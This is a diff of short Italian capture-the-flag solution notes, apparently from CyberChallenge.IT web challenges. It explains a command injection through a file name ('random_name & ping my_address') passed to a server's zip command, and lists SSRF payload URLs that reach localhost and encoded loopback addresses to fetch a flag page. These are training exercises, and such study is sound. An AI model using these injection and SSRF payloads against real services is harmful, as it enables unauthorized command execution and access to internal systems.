@@ -1,2 +1,15 @@
 WS_1.03 - ZipZap - level 1
 dal codice python si osserva che tutti i nomi dei zip creati nel server sono generati random e sanitizzati. L'unica eccezione sono i nomi dei file all'interno degli zip, ovvero il nome del file originale prima di essere zippato. quindi nominando il file "random_name & ping my_address" ad esempio possiamo eseguire il comando ping dal server, perchè esso esegue il comando zip + zip_path + my_file_name quindi tramite & possiamo eseguire il nostro comando in parallelo, in questo caso ping o qualsiasi altro comando
+-----------------------------------------------
+
+WS_1.05 - ssrf basics - level 1
+http://ssrf1.challs.cyberchallenge.it/?url=http://localhost/get_flag.php
+----------------------------------------------
+
+WS_1.05 - ssrf basics - level 2
+http://ssrf2.challs.cyberchallenge.it/?url=http://0.0.0.0/get_flag.php
+---------------------------------------------
+
+http://ssrf3.challs.cyberchallenge.it/?url=http://%00%2E%00%2E%00%2E%00/get_flag.php
+
+http://ssrf3.challs.cyberchallenge.it/?url=http://%01%02%07%2E%00%2E%00%2E%02/get_flag.php
